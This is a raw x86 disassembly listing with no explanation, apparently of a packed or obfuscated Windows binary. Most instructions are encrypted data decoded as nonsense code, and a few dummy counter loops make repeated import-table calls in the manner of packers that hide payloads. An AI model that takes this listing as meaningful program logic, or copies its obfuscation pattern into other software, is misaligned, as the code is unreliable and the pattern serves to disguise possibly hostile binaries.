  40ec26:	cli    
  40ec27:	cmp    ch,BYTE PTR [ecx-0x27]
  40ec2a:	dec    ecx
  40ec2b:	jns    0x40ec57
  40ec2d:	and    BYTE PTR [edi+ebx*2-0x3d],0xc
  40ec32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec33:	mov    edi,0x95304a82
  40ec38:	lods   eax,DWORD PTR ds:[esi]
  40ec39:	sub    DWORD PTR [ebp-0x3b],esi
  40ec3c:	pop    edx
  40ec3d:	cmp    al,0xda
  40ec3f:	mov    eax,ds:0x3609f0d2
  40ec44:	(bad)  
  40ec45:	mov    BYTE PTR [ecx],0x26
  40ec48:	dec    esp
  40ec4a:	fcmovnbe st,st(5)
  40ec4c:	xor    al,BYTE PTR [ecx+eiz*4]
  40ec4f:	cdq    
  40ec50:	call   0x6435:0x78af557d
  40ec57:	xchg   edi,eax
  40ec58:	(bad)  
  40ec59:	pop    eax
  40ec5a:	fs jge 0x40ec9d
  40ec5d:	ret    0x4689
  40ec60:	push   esp
  40ec61:	inc    edi
  40ec62:	and    DWORD PTR [esi],eax
  40ec64:	and    dl,BYTE PTR [ebx]
  40ec66:	pop    edx
  40ec67:	out    0xb,eax
  40ec69:	pop    ebp
  40ec6a:	sub    DWORD PTR [eax],0x35
  40ec6d:	bound  esp,QWORD PTR [ecx-0x3dcf0d85]
  40ec73:	ret    
  40ec74:	jmp    0x40ecef
  40ec76:	mov    bl,0x51
  40ec78:	lahf   
  40ec79:	out    dx,al
  40ec7a:	cmp    al,0x1d
  40ec7c:	sub    ecx,edi
  40ec7e:	or     eax,0x4b134baa
  40ec83:	ror    BYTE PTR [ebp-0x48f01e58],cl
  40ec89:	and    ecx,eax
  40ec8b:	and    eax,0x6e61a38c
  40ec90:	mov    esi,0x413bc868
  40ec95:	inc    esp
  40ec96:	inc    eax
  40ec97:	and    DWORD PTR ds:0xd36b7f87,esp
  40ec9d:	jbe    0x40ec25
  40ec9f:	loopne 0x40ecfa
  40eca1:	jge    0x40ec71
  40eca3:	jnp    0x40ecfa
  40eca5:	inc    ebp
  40eca6:	repz jo 0x40ecc5
  40eca9:	fmulp  st(0),st
  40ecab:	mov    ch,0xdd
  40ecad:	js     0x40ed01
  40ecaf:	outs   dx,DWORD PTR ds:[esi]
  40ecb0:	mov    esi,DWORD PTR [esi-0x754e9959]
  40ecb6:	adc    edx,ebp
  40ecb8:	aad    0x33
  40ecba:	pop    esp
  40ecbb:	scas   al,BYTE PTR es:[edi]
  40ecbc:	and    BYTE PTR [eax+eiz*1-0x1b5b56b2],cl
  40ecc3:	retf   0xd938
  40ecc6:	jne    0x40ed20
  40ecc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ecc9:	pusha  
  40ecca:	imul   esp,DWORD PTR [edi],0x31
  40eccd:	ficom  DWORD PTR [ebx+0x6ea961a8]
  40ecd3:	gs stc 
  40ecd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ecd6:	test   al,0xff
  40ecd8:	nop
  40ecd9:	xlat   BYTE PTR ds:[ebx]
  40ecda:	sti    
  40ecdb:	in     eax,dx
  40ecdc:	fwait
  40ecdd:	retf   
  40ecde:	gs js  0x40ec73
  40ece1:	das    
  40ece2:	les    edi,FWORD PTR [ecx+ebp*4+0x6a3a5cf9]
  40ece9:	dec    ebp
  40ecea:	(bad)  
  40eceb:	adc    esi,DWORD PTR [ebp+0x6da9d6cf]
  40ecf1:	and    al,0x98
  40ecf3:	jbe    0x40ed51
  40ecf5:	mov    ds:0x21a1a3ec,al
  40ecfa:	mov    esp,0x78909ae6
  40ecff:	adc    BYTE PTR [eax+0x64],ah
  40ed02:	xor    al,0x56
  40ed04:	push   ecx
  40ed05:	and    dl,dl
  40ed07:	push   edx
  40ed08:	or     eax,0x71cae2f9
  40ed0d:	or     al,0x6f
  40ed0f:	test   DWORD PTR [ebp+0x54d38ef4],ecx
  40ed15:	rol    DWORD PTR [edi-0x24845a62],1
  40ed1b:	mov    ch,0x14
  40ed1d:	in     al,dx
  40ed1e:	pusha  
  40ed1f:	mov    ds:0x34fc6db5,al
  40ed24:	dec    edx
  40ed25:	ins    DWORD PTR es:[edi],dx
  40ed26:	mov    bh,0xed
  40ed28:	push   ds
  40ed29:	stc    
  40ed2a:	mov    WORD PTR [ecx+eiz*1-0x56d390e8],ds
  40ed31:	aaa    
  40ed32:	es leave 
  40ed34:	pop    esi
  40ed35:	out    0xf,eax
  40ed37:	gs jnp 0x40ed38
  40ed3a:	pop    esp
  40ed3b:	(bad)  
  40ed3c:	in     eax,dx
  40ed3d:	jo     0x40eccc
  40ed3f:	mov    ah,0x82
  40ed41:	xor    BYTE PTR [eax-0x2a60e6fc],al
  40ed47:	(bad)  
  40ed48:	dec    edi
  40ed49:	and    edx,DWORD PTR [ebx-0x5cf7036f]
  40ed4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed50:	leave  
  40ed51:	mov    bh,0x1b
  40ed53:	test   eax,edi
  40ed55:	popa   
  40ed56:	or     BYTE PTR [eax],0xac
  40ed59:	cdq    
  40ed5a:	aam    0x75
  40ed5c:	jne    0x40ecfa
  40ed5e:	adc    DWORD PTR [ecx+0x7b],eax
  40ed61:	mov    eax,ds:0xed35ac44
  40ed66:	adc    eax,0x8c22f7bc
  40ed6b:	dec    edi
  40ed6c:	push   0x28
  40ed6e:	aaa    
  40ed6f:	mov    DWORD PTR [esi+0x793a8772],esi
  40ed75:	inc    ebp
  40ed76:	retf   
  40ed77:	lock mov ch,BYTE PTR [edi-0x66b731cf]
  40ed7e:	push   cs
  40ed7f:	add    edi,edi
  40ed81:	adc    eax,0xb40a468c
  40ed86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed87:	test   eax,0xe1e50054
  40ed8c:	pop    ebp
  40ed8d:	pop    esp
  40ed8e:	jge    0x40ed82
  40ed90:	sbb    BYTE PTR [eax+0x6230a965],ch
  40ed96:	retf   
  40ed97:	in     eax,dx
  40ed98:	mov    ecx,0xd2bc233
  40ed9d:	push   ebx
  40ed9e:	ss inc ebx
  40eda0:	add    BYTE PTR [ebx],dh
  40eda2:	repnz mov DWORD PTR ds:0x4336d3,0x18
  40edad:	cmp    DWORD PTR ds:0x4336d3,0x0
  40edb4:	je     0x40edf4
  40edba:	cmp    DWORD PTR ds:0x4336d3,0x20
  40edc1:	jne    0x40ede2
  40edc7:	push   DWORD PTR [ebp-0x14]
  40edca:	push   DWORD PTR [ebp-0xc]
  40edcd:	push   0x5135
  40edd2:	push   0x2d1e
  40edd7:	push   0x400000
  40eddc:	call   DWORD PTR ds:0x4120f0
  40ede2:	mov    ecx,DWORD PTR ds:0x4336d3
  40ede8:	dec    ecx
  40ede9:	mov    DWORD PTR ds:0x4336d3,ecx
  40edef:	jmp    0x40edad
  40edf4:	mov    ecx,0x32729b
  40edf9:	add    esi,ecx
  40edfb:	add    eax,ecx
  40edfd:	imul   eax,esi
  40ee00:	mov    esi,DWORD PTR [ebp+0xc]
  40ee03:	cmp    esi,eax
  40ee05:	jne    0x40ee21
  40ee0b:	mov    eax,DWORD PTR [ebp-0x4]
  40ee0e:	mov    esi,DWORD PTR [ebp-0x8]
  40ee11:	xor    eax,edx
  40ee13:	xor    esi,edx
  40ee15:	add    eax,ecx
  40ee17:	add    esi,ecx
  40ee19:	imul   eax,esi
  40ee1c:	jmp    0x40f053
  40ee21:	mov    eax,DWORD PTR [ebp+0xc]
  40ee24:	mov    eax,DWORD PTR [eax+0x78]
  40ee27:	mov    DWORD PTR [ebp+0xc],eax
  40ee2a:	mov    eax,DWORD PTR [ebp-0x4]
  40ee2d:	mov    esi,DWORD PTR [ebp-0x8]
  40ee30:	xor    eax,edx
  40ee32:	xor    esi,edx
  40ee34:	add    eax,ecx
  40ee36:	add    esi,ecx
  40ee38:	imul   eax,esi
  40ee3b:	mov    esi,DWORD PTR [ebp+0xc]
  40ee3e:	cmp    esi,eax
  40ee40:	mov    eax,DWORD PTR [ebp-0x4]
  40ee43:	je     0x40ee0e
  40ee49:	xor    eax,edx
  40ee4b:	add    eax,ecx
  40ee4d:	mov    ecx,DWORD PTR [ebp+0xc]
  40ee50:	imul   eax,ecx
  40ee53:	add    eax,DWORD PTR [ebp+0x8]
  40ee56:	mov    DWORD PTR [ebp+0xc],eax
  40ee59:	jmp    0x40f050
  40ee5e:	mov    dl,0xbd
  40ee60:	push   0xffffffdc
  40ee62:	jno    0x40ee4d
  40ee64:	mov    al,0x51
  40ee66:	ja     0x40eebe
  40ee68:	sbb    edx,DWORD PTR [edx-0xe029bec]
  40ee6e:	lock mov ds:0x7f547e7e,eax
  40ee74:	jle    0x40eef4
  40ee76:	ficomp DWORD PTR ss:[ebp+0x36]
  40ee7a:	(bad)  
  40ee7b:	adc    ch,bl
  40ee7d:	cmp    DWORD PTR [eax+edx*1+0x707930eb],ebp
  40ee84:	add    eax,0x6978140a
  40ee89:	(bad)  
  40ee8b:	and    ch,BYTE PTR [eax+0x2f342e7b]
  40ee91:	mov    ch,0x9d
  40ee93:	adc    DWORD PTR [eax+ebx*1+0x79b3169c],eax
  40ee9a:	mov    al,ds:0x7bd3eb00
  40ee9f:	into   
  40eea0:	add    bh,BYTE PTR [ebp-0x26]
  40eea3:	aad    0xd1
  40eea5:	(bad)  
  40eea6:	into   
  40eea7:	lods   al,BYTE PTR ds:[esi]
  40eea8:	ins    BYTE PTR es:[edi],dx
  40eea9:	fnstenv [ebx+ecx*2-0x4d]
  40eead:	test   DWORD PTR [esi+ecx*8+0x5e],esi
  40eeb1:	push   DWORD PTR [esi+eax*1+0xd203227]
  40eeb8:	sub    al,0xce
  40eeba:	adc    eax,DWORD PTR [edx]
  40eebc:	or     edx,eax
  40eebe:	and    DWORD PTR [edx+edi*4+0x74],edi
  40eec2:	fbstp  TBYTE PTR [edx+eiz*8-0x66c2c476]
  40eec9:	adc    dh,BYTE PTR [edi]
  40eecb:	or     eax,0xc55af7d5
  40eed0:	jae    0x40ee99
  40eed2:	out    dx,eax
  40eed3:	das    
  40eed4:	mov    bh,0xed
  40eed6:	pushf  
  40eed7:	ret    
  40eed8:	shl    BYTE PTR [ebx-0x80],0xba
  40eedc:	hlt    
  40eedd:	ins    DWORD PTR es:[edi],dx
  40eede:	loopne 0x40ee7c
  40eee0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eee2:	sbb    DWORD PTR [eax],0x37f81a86
  40eee8:	fwait
  40eee9:	pushf  
  40eeea:	retf   
  40eeeb:	rep outs dx,DWORD PTR ds:[esi]
  40eeed:	lock sbb DWORD PTR [eax+0x971afbd],edx
  40eef4:	pop    es
  40eef5:	cdq    
  40eef6:	push   cs
  40eef7:	xchg   ebp,eax
  40eef8:	cwde   
  40eef9:	cdq    
  40eefa:	pop    ebx
  40eefb:	adc    DWORD PTR [ecx-0x1c935c2f],ecx
  40ef01:	lock retf 0x1fc2
  40ef05:	push   esi
  40ef06:	xor    eax,DWORD PTR [edi]
  40ef08:	test   eax,0xf00bf867
  40ef0d:	cdq    
  40ef0e:	pop    edi
  40ef0f:	pusha  
  40ef10:	or     dh,BYTE PTR [eax+0x5b]
  40ef13:	push   DWORD PTR [ecx+0x54]
  40ef16:	mov    ds:0x6bb13e35,eax
  40ef1b:	(bad)  
  40ef1d:	test   al,0xf8
  40ef1f:	mov    esp,0x6573dccb
  40ef24:	pop    ss
  40ef25:	jmp    0xcd75:0xf3d114ce
  40ef2c:	inc    esi
  40ef2d:	mov    WORD PTR [edi-0x4dc92635],?
  40ef33:	dec    esi
  40ef34:	mov    ah,0x2b
  40ef36:	ss hlt 
  40ef38:	mov    ebp,0x8beccd57
  40ef3d:	popa   
  40ef3e:	dec    ecx
  40ef3f:	dec    ebp
  40ef40:	cmp    eax,0x8c632b93
  40ef45:	fwait
  40ef46:	outs   dx,BYTE PTR ds:[esi]
  40ef47:	cld    
  40ef48:	leave  
  40ef49:	sbb    eax,0xd44d71dc
  40ef4e:	pop    ss
  40ef4f:	stc    
  40ef50:	sbb    ah,BYTE PTR [edx+0x2e]
  40ef53:	stos   DWORD PTR es:[edi],eax
  40ef54:	sahf   
  40ef55:	jp     0x40eedf
  40ef57:	fcmovnb st,st(7)
  40ef59:	test   al,0xe4
  40ef5b:	xchg   esp,eax
  40ef5c:	mov    eax,ds:0xf8991c0a
  40ef61:	ss retf 
  40ef63:	jo     0x40ef7e
  40ef65:	cld    
  40ef66:	mov    ah,BYTE PTR [esi+0x19b3a2fc]
  40ef6c:	jg     0x40ef45
  40ef6e:	inc    ebp
  40ef6f:	cmp    ebp,DWORD PTR [esi-0x58]
  40ef72:	cld    
  40ef73:	sub    ah,BYTE PTR [ebp+0x77]
  40ef76:	add    BYTE PTR [edi+ebx*8],bl
  40ef79:	fild   QWORD PTR [esi+0x15904a88]
  40ef7f:	jmp    0x40ef0b
  40ef81:	mov    ah,0xc9
  40ef83:	jecxz  0x40efa7
  40ef85:	test   eax,0xa44a7719
  40ef8a:	lahf   
  40ef8b:	mov    ah,0x1a
  40ef8d:	and    dl,dh
  40ef8f:	clc    
  40ef90:	push   ebp
  40ef91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef92:	push   eax
  40ef93:	outs   dx,BYTE PTR ds:[esi]
  40ef94:	xor    eax,0x1b3cbff2
  40ef99:	add    BYTE PTR [ebx+edi*8-0x5],bl
  40ef9d:	pop    edi
  40ef9e:	sub    al,0xf0
  40efa0:	and    eax,0xa9b4bcf3
  40efa5:	fadd   DWORD PTR [esi-0x10]
  40efa8:	adc    eax,0x9c9ed43f
  40efad:	mov    eax,0x8ee598a8
  40efb2:	ins    BYTE PTR es:[edi],dx
  40efb3:	call   0x97fc:0x32372515
  40efba:	cmp    BYTE PTR [ecx-0x2b],ch
  40efbd:	out    dx,eax
  40efbe:	gs call 0x67dc:0xbbd595a3
  40efc6:	push   edi
  40efc7:	das    
  40efc8:	cmp    DWORD PTR [ecx],0x56ec7c3e
  40efce:	leave  
  40efcf:	repnz iret 
  40efd1:	pop    esp
  40efd2:	ret    
  40efd3:	jg     0x40efe6
  40efd5:	dec    ecx
  40efd6:	sub    edi,ebp
  40efd8:	cs inc ebx
  40efda:	pop    ds
  40efdb:	add    al,al
  40efdd:	and    al,0x91
  40efdf:	inc    ebp
  40efe0:	xchg   ecx,esi
  40efe2:	cmp    bh,0xff
  40efe5:	or     eax,0x1dedf44f
  40efea:	mov    edi,esi
  40efec:	pop    edi
  40efed:	call   0xd227:0xe75e17ea
  40eff4:	sub    edi,DWORD PTR [esi+0x68]
  40eff7:	ret    
  40eff8:	aad    0xc3
  40effa:	neg    DWORD PTR [ebp-0x79]
  40effd:	xor    al,0x22
  40efff:	dec    ebx
  40f000:	imul   ebp,edx,0x17
  40f003:	mov    eax,ds:0x6c770eb6
  40f008:	sbb    bh,BYTE PTR [edx-0x59be989]
  40f00e:	aas    
  40f00f:	sar    BYTE PTR [ebx],0xac
  40f012:	xor    edx,0xd34857c6
  40f018:	repz data16 repz js 0x40eff9
  40f01d:	stc    
  40f01e:	adc    dh,dh
  40f020:	test   al,ch
  40f022:	jmp    0x939b:0xcef16ad6
  40f029:	jge    0x40f08d
  40f02b:	mov    edx,0x29a14810
  40f030:	pmullw mm2,QWORD PTR [esi-0x63]
  40f034:	gs ret 
  40f036:	or     al,0x5f
  40f038:	outs   dx,BYTE PTR ds:[esi]
  40f039:	pop    eax
  40f03a:	xchg   esi,eax
  40f03b:	imul   ebp,edi,0x4af91169
  40f041:	jmp    0x40f069
  40f043:	sub    eax,0x2205b0b8
  40f048:	push   ebp
  40f049:	jle    0x40efea
  40f04b:	sub    bh,BYTE PTR [ebp-0x74e1d4d5]
  40f051:	inc    ebp
  40f052:	or     al,0x5e
  40f054:	leave  
  40f055:	ret    0x8
  40f058:	push   ebp
  40f059:	mov    ebp,esp
  40f05b:	push   ecx
  40f05c:	push   ecx
  40f05d:	inc    DWORD PTR ds:0x43369b
  40f063:	jmp    0x40f382
  40f068:	inc    ecx
  40f069:	iret   
  40f06a:	scas   al,BYTE PTR es:[edi]
  40f06b:	(bad)  
  40f06c:	mov    al,0x67
  40f06e:	jno    0x40f0b9
  40f070:	sub    DWORD PTR ds:0xff7f1594,ebx
  40f076:	jmp    0x7ee2c6c7
  40f07b:	jle    0x40f0f9
  40f07d:	jge    0x40f0fd
  40f07f:	jle    0x40f00c
  40f081:	mov    esp,0xc65e2e62
  40f086:	mov    ah,bh
  40f088:	mov    dl,0xc1
  40f08a:	rcr    esi,cl
  40f08c:	hlt    
  40f08d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f08e:	jecxz  0x40f0a8
  40f090:	jge    0x40f0ef
  40f092:	out    dx,al
  40f093:	test   DWORD PTR [ebx],edx
  40f095:	test   ch,cl
  40f097:	inc    BYTE PTR [esi+0x3bcec7e8]
  40f09d:	mov    ds:0x5eef0e0b,eax
  40f0a2:	pop    ebp
  40f0a3:	ss jle 0x40f102
  40f0a6:	sar    dh,0xab
  40f0a9:	cwde   
  40f0aa:	mov    ch,bl
  40f0ac:	push   ebp
  40f0ad:	pushf  
  40f0ae:	and    edx,DWORD PTR [edx]
  40f0b0:	push   0x9ab081e4
  40f0b5:	dec    ebp
  40f0b6:	repnz (bad) 
  40f0b8:	hlt    
  40f0b9:	inc    ecx
  40f0ba:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  40f0bc:	xor    ecx,DWORD PTR [eax]
  40f0be:	in     al,dx
  40f0bf:	push   edi
  40f0c0:	rcl    BYTE PTR [ebp+0x3f],0x9a
  40f0c4:	jns    0x40f130
  40f0c6:	inc    esp
  40f0c7:	(bad)  
  40f0c8:	pop    ebx
  40f0c9:	cmp    al,0xc
  40f0cb:	leave  
  40f0cc:	or     al,0xe4
  40f0ce:	fdiv   QWORD PTR [esi+eax*8+0x82f8f18]
  40f0d5:	mov    edi,0x2c34f59f
  40f0da:	and    edx,ebp
  40f0dc:	adc    BYTE PTR [ecx+0x42b9a682],dl
  40f0e2:	cmp    cl,BYTE PTR [edi-0x500cc811]
  40f0e8:	xlat   BYTE PTR ds:[ebx]
  40f0e9:	dec    edi
  40f0ea:	dec    eax
  40f0eb:	(bad)  
  40f0ec:	icebp  
  40f0ed:	cmc    
  40f0ee:	js     0x40f137
  40f0f0:	bound  ecx,QWORD PTR [ecx]
  40f0f2:	add    edi,DWORD PTR [edi+0x43]
  40f0f5:	sti    
  40f0f6:	add    al,0x5e
  40f0f8:	xchg   esp,eax
  40f0f9:	mov    bh,0x12
  40f0fb:	pop    es
  40f0fc:	xchg   esi,eax
  40f0fd:	push   edi
  40f0fe:	retf   0x5930
  40f101:	cmp    edx,DWORD PTR [edx-0x116e0ade]
  40f107:	lea    ebp,[ebx]
  40f109:	push   edi
  40f10a:	cmp    BYTE PTR [ebx-0x1ad71349],bl
  40f110:	sahf   
  40f111:	and    BYTE PTR [eax],ch
  40f113:	or     eax,0x715d9249
  40f118:	jle    0x40f136
  40f11a:	out    dx,al
  40f11b:	test   DWORD PTR [edi-0x5bb5cf42],eax
  40f121:	scas   eax,DWORD PTR es:[edi]
  40f122:	fcmovne st,st(6)
  40f124:	sub    edi,0xbd756c92
  40f12a:	pop    edx
  40f12b:	shl    esi,cl
  40f12d:	fld    DWORD PTR [eax+0x6493619a]
  40f133:	cmp    cl,BYTE PTR [ebx]
  40f135:	sub    eax,0xbccc049b
  40f13a:	sar    DWORD PTR [eax+esi*2],cl
  40f13d:	mov    edi,0x523971b4
  40f142:	in     al,0x85
  40f144:	pop    es
  40f145:	push   0xffffffc4
  40f147:	lods   eax,DWORD PTR ds:[esi]
  40f148:	ror    DWORD PTR [ecx],cl
  40f14a:	je     0x40f112
  40f14c:	dec    eax
  40f14d:	xchg   edx,eax
  40f14e:	mov    eax,ds:0xc12b3abc
  40f153:	out    0x88,eax
  40f155:	adc    ebx,DWORD PTR [ecx]
  40f157:	adc    BYTE PTR [esp+edi*1-0x8cb280d],bh
  40f15e:	ret    0x5188
  40f161:	push   0x1246053e
  40f166:	sub    BYTE PTR [eax],0x21
  40f169:	and    BYTE PTR [edx-0x42],al
  40f16c:	pop    edx
  40f16d:	cli    
  40f16e:	fisttp QWORD PTR [eax+0x63]
  40f171:	cmp    ecx,edi
  40f173:	pushfw 
  40f175:	adc    al,0x12
  40f177:	int3   
  40f178:	nop
  40f179:	add    al,0x23
  40f17b:	jb     0x40f1cb
  40f17d:	xchg   edi,eax
  40f17e:	ins    BYTE PTR es:[edi],dx
  40f17f:	dec    esi
  40f180:	push   es
  40f181:	cmc    
  40f182:	int    0x1
  40f184:	mov    esp,0xbdd58634
  40f189:	leave  
  40f18a:	loope  0x40f1d8
  40f18c:	ins    BYTE PTR es:[edi],dx
  40f18d:	push   cs
  40f18e:	adc    cl,BYTE PTR [edi]
  40f190:	mov    ebp,DWORD PTR [esi-0x56053a71]
  40f196:	outs   dx,BYTE PTR ds:[esi]
  40f197:	and    edi,edx
  40f199:	nop
  40f19a:	jb     0x40f205
  40f19c:	dec    eax
  40f19d:	push   0xb52223c2
  40f1a2:	int3   
  40f1a3:	out    0xb9,al
  40f1a5:	and    DWORD PTR [edi-0x5e],ebp
  40f1a8:	or     bl,BYTE PTR [eax-0x3d]
  40f1ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f1ac:	mov    BYTE PTR [edi+0x479f29d6],al
  40f1b2:	cmp    al,0x94
  40f1b4:	push   es
  40f1b5:	push   esi
  40f1b6:	cmc    
  40f1b7:	pop    eax
  40f1b8:	xor    al,0xa
  40f1ba:	mov    BYTE PTR [edx],0x4f
  40f1bd:	fmul   DWORD PTR [edi-0x76a1ddc3]
  40f1c3:	push   edx
  40f1c4:	inc    ecx
  40f1c5:	jae    0x40f1e6
  40f1c7:	scas   eax,DWORD PTR es:[edi]
  40f1c8:	xchg   esp,eax
  40f1c9:	repnz icebp 
  40f1cb:	cmc    
  40f1cc:	cmp    eax,0x662d0cbe
  40f1d1:	retf   
  40f1d2:	jbe    0x40f24a
  40f1d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f1d5:	jg     0x40f1e7
  40f1d7:	ficomp DWORD PTR [eax+0x7a]
  40f1da:	push   0xb8b50042
  40f1df:	in     eax,0x2c
  40f1e1:	out    0x8c,al
  40f1e3:	in     eax,0x8a
  40f1e5:	pop    esi
  40f1e6:	push   eax
  40f1e7:	mov    edi,0xdd2b72ca
  40f1ec:	xlat   BYTE PTR ds:[ebx]
  40f1ed:	cmp    DWORD PTR [ecx+0x7e19c285],esi
  40f1f3:	or     eax,0x2ee75f8a
  40f1f8:	fs jne 0x40f1cc
  40f1fb:	dec    eax
  40f1fc:	test   al,0x45
  40f1fe:	je     0x40f20c
  40f200:	dec    BYTE PTR [ebx-0x2a]
  40f203:	shr    dl,cl
  40f205:	jne    0x40f249
  40f207:	clc    
  40f208:	stos   DWORD PTR es:[edi],eax
  40f209:	mov    al,0x5e
  40f20b:	js     0x40f253
  40f20d:	jmp    0x40f1f8
  40f20f:	sub    al,0xd9
  40f211:	stc    
  40f212:	xchg   ebp,eax
  40f213:	mov    esi,0x6b6c074d
  40f218:	rcl    DWORD PTR [edx],cl
  40f21a:	clc    
  40f21b:	sbb    BYTE PTR [ebp-0x3d279eb8],cl
  40f221:	cdq    
  40f222:	lds    esp,FWORD PTR [esp+ecx*2-0x37c7bcd3]
  40f229:	adc    al,0x7d
  40f22b:	aaa    
  40f22c:	ret    
  40f22d:	stos   DWORD PTR es:[edi],eax
  40f22e:	(bad)  
  40f230:	les    esi,FWORD PTR [ecx]
  40f232:	dec    edi
  40f233:	mov    BYTE PTR [eax-0x7b],ch
  40f236:	(bad)  
  40f237:	xor    eax,DWORD PTR [eax]
  40f239:	das    
  40f23a:	inc    edx
  40f23b:	push   ds
  40f23c:	test   DWORD PTR [ecx-0xe],esi
  40f23f:	pop    ebx
  40f240:	mov    bh,0x63
  40f242:	push   ecx
  40f243:	pop    ds
  40f244:	sbb    edx,DWORD PTR [ebp+0x205c5b89]
  40f24a:	std    
  40f24b:	sbb    eax,0xe4499a9b
  40f250:	mov    esi,0x6d377d2
  40f255:	popf   
  40f256:	jae    0x40f2cf
  40f258:	test   al,0x2e
  40f25a:	cli    
  40f25b:	dec    ecx
  40f25c:	nop
  40f25d:	enter  0x3f1c,0xb4
  40f261:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f262:	ret    
  40f263:	mov    edi,0xb73792cc
  40f268:	clc    
  40f269:	push   esi
  40f26a:	xchg   esp,eax
  40f26b:	jmp    0x40f22d
  40f26d:	inc    eax
  40f26e:	mov    ebx,0x29b8a4d1
  40f273:	jecxz  0x40f22b
  40f275:	call   0x880c374f
  40f27a:	in     al,dx
  40f27b:	or     dh,BYTE PTR ds:0x5969e7eb
  40f281:	jmp    DWORD PTR [ebx]
  40f283:	mov    al,0x3b
  40f285:	sub    eax,0xa0421b13
  40f28a:	adc    eax,0x504b8094
  40f28f:	sub    eax,0xca213ae8
  40f294:	stos   BYTE PTR es:[edi],al
  40f295:	ins    BYTE PTR es:[edi],dx
  40f296:	clc    
  40f297:	cmovl  esp,eax
  40f29a:	push   eax
  40f29b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f29c:	jnp    0x40f2aa
  40f29e:	xor    ch,dl
  40f2a0:	push   cs
  40f2a1:	(bad)  
  40f2a3:	or     al,0x94
  40f2a5:	and    BYTE PTR [edi-0x4507537b],ah
  40f2ab:	dec    edi
  40f2ac:	mov    ecx,0x23508e1c
  40f2b1:	add    BYTE PTR [ebp-0x324aa146],al
  40f2b7:	push   es
  40f2b8:	sti    
  40f2b9:	and    esi,DWORD PTR [esp+edx*8+0x49]
  40f2bd:	cmp    eax,0x4850af7b
  40f2c2:	loopne 0x40f25c
  40f2c4:	mov    ebx,0x3e72f2cd
  40f2c9:	call   0x363:0xeec49839
  40f2d0:	cmp    esp,ebx
  40f2d2:	mov    edx,0x39239c61
  40f2d7:	pop    esp
  40f2d8:	fs and eax,0xfe7c1303
  40f2de:	sub    eax,0xc1841825
  40f2e3:	push   ebx
  40f2e4:	lds    esp,FWORD PTR [eax]
  40f2e6:	mov    bh,0x83
  40f2e8:	add    al,0x82
  40f2ea:	cwde   
  40f2eb:	in     eax,0x46
  40f2ed:	shl    bh,cl
  40f2ef:	outs   dx,DWORD PTR ds:[esi]
  40f2f0:	mov    ds:0x8e3018b8,eax
  40f2f5:	int3   
  40f2f6:	not    DWORD PTR [edi]
  40f2f8:	test   DWORD PTR [esi-0x61],edi
  40f2fb:	js     0x40f331
  40f2fd:	shl    DWORD PTR [esp+edi*1],1
  40f300:	ror    DWORD PTR [eax-0x6a],0xd7
  40f304:	in     eax,dx
  40f305:	mov    esp,0x7e7cc2c5
  40f30a:	(bad)  
  40f30c:	add    esi,edi
  40f30e:	in     al,0x99
  40f310:	stos   BYTE PTR es:[edi],al
  40f311:	mov    edx,0x9c4b82e7
  40f316:	push   0xf9554beb
  40f31b:	mov    ah,0x7a
  40f31d:	jbe    0x40f2e9
  40f31f:	jno    0x40f366
  40f321:	and    edi,DWORD PTR [eax-0x50d3f9d4]
  40f327:	jmp    0xa70b:0xb30ef0a0
  40f32e:	or     edi,DWORD PTR [ecx+edx*2]
  40f331:	pop    ecx
  40f332:	mov    esp,0x91ddfb71
  40f337:	(bad)  
  40f338:	into   
  40f339:	mov    DWORD PTR [ebp-0x59],edi
  40f33c:	and    al,0xf1
  40f33e:	(bad)  
  40f33f:	jmp    0x40f398
  40f341:	sti    
  40f342:	ds hlt 
  40f344:	add    edx,DWORD PTR [esi-0x6f6f0c20]
  40f34a:	popf   
  40f34b:	and    BYTE PTR [ebx+0x31],al
  40f34e:	sti    
  40f34f:	lods   al,BYTE PTR ds:[esi]
  40f350:	push   0xf54c7cdc
  40f355:	mov    dh,0xa0
  40f357:	adc    esp,ecx
  40f359:	dec    BYTE PTR [esi+0x7306ca10]
  40f35f:	ins    DWORD PTR es:[edi],dx
  40f360:	neg    DWORD PTR [edx]
  40f362:	cmc    
  40f363:	rcl    DWORD PTR [edx],0x32
  40f366:	nop
  40f367:	pop    edx
  40f368:	mov    cl,0x48
  40f36a:	jmp    0x5595:0xda469e9a
  40f371:	das    
  40f372:	adc    DWORD PTR [ebx],esp
  40f374:	adc    ebp,0x24ac12fa
  40f37a:	rcl    DWORD PTR ss:0x15ddd2fa,cl
  40f381:	fistp  QWORD PTR [eax-0x7637acf]
  40f387:	and    DWORD PTR ds:0x433727,0x0
  40f391:	xor    ecx,ecx
  40f393:	xor    ecx,DWORD PTR ds:0x433727
  40f399:	inc    ecx
  40f39a:	mov    DWORD PTR ds:0x433727,ecx
  40f3a0:	cmp    DWORD PTR ds:0x433727,0x7
  40f3a7:	jne    0x40f3b6
  40f3ad:	push   DWORD PTR [ebp-0x14]
  40f3b0:	call   DWORD PTR ds:0x41236c
  40f3b6:	cmp    DWORD PTR ds:0x433727,0x6
  40f3bd:	jne    0x40f3d0
  40f3c3:	mov    ecx,DWORD PTR ds:0x433727
  40f3c9:	inc    ecx
  40f3ca:	mov    DWORD PTR ds:0x433727,ecx
  40f3d0:	cmp    DWORD PTR ds:0x433727,0x17
  40f3d7:	jb     0x40f391
  40f3dd:	mov    edx,DWORD PTR ds:0x43362b
  40f3e3:	mov    ecx,DWORD PTR ds:0x433703
  40f3e9:	sub    edx,ecx
  40f3eb:	sub    edx,DWORD PTR [edx+ecx*1]
  40f3ee:	mov    DWORD PTR [ebp-0x8],eax
  40f3f1:	mov    DWORD PTR ds:0x433657,0x13
  40f3fb:	cmp    DWORD PTR ds:0x433657,0x0
  40f402:	je     0x40f4d8
